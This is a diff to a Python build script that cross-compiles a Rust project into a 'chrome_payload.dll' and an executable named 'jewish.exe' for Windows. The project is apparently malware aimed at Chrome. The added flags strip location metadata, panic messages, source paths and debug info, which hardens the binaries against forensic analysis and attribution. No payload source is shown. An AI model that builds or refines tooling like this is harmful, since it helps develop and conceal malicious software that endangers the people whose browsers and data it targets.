@@ -39,10 +39,10 @@ RELEASE_DIR = os.path.join(PROJECT_ROOT, "release")
 # On Linux, cross-compile for Windows; on Windows build natively
 import platform as _platform
 if _platform.system() == "Windows":
-    _CARGO_EXTRA = []
+    _CARGO_EXTRA = ["-Z", "build-std=std,panic_abort"]
     _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "release")
 else:
-    _CARGO_EXTRA = ["--target", "x86_64-pc-windows-gnu"]
+    _CARGO_EXTRA = ["--target", "x86_64-pc-windows-gnu", "-Z", "build-std=std,panic_abort"]
     _TARGET_REL  = os.path.join(PROJECT_ROOT, "target", "x86_64-pc-windows-gnu", "release")
 
 TARGET_EXE = os.path.join(_TARGET_REL, "jewish.exe")
@@ -178,13 +178,18 @@ def main():
         f"--remap-path-prefix=.=b "                 # relative paths used by some macros
         f"--remap-path-prefix=src=s "               # bare "src/…" references
         f"-C debuginfo=0 "                           # strip all debug info at compile time
-        f"-C force-frame-pointers=n"                 # no frame pointers
+        f"-C force-frame-pointers=n "               # no frame pointers
+        # nightly: suppress ALL location metadata (file/line in panics from any crate)
+        f"-Z location-detail=none "
+        # nightly: replace all panics with immediate abort (no unwind, no message, no path)
+        f"-Z unstable-options "
+        f"-C panic=immediate-abort"
     )
     os.environ["RUSTFLAGS"] = (os.environ.get("RUSTFLAGS", "") + " " + _remap).strip()
 
     # Step 3: Build payload DLL (64-bit)
     print("\n===== 2/7 Building Payload DLLs =====")
-    if not run_command(["cargo", "build", "--release", "-p", "chrome-payload"] + _CARGO_EXTRA, "Building chrome_payload.dll (64-bit)"):
+    if not run_command(["cargo", "+nightly", "build", "--release", "-p", "chrome-payload"] + _CARGO_EXTRA, "Building chrome_payload.dll (64-bit)"):
         print("[!] Payload build failed - aborting")
         sys.exit(1)
     if not os.path.exists(TARGET_DLL):
@@ -198,7 +203,7 @@ def main():
     env = {**os.environ}
     try:
         process = subprocess.Popen(
-            ["cargo", "build", "--release", "-p", "jewish"] + _CARGO_EXTRA,
+            ["cargo", "+nightly", "build", "--release", "-p", "jewish"] + _CARGO_EXTRA,
             cwd=PROJECT_ROOT, env=env,
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
         )
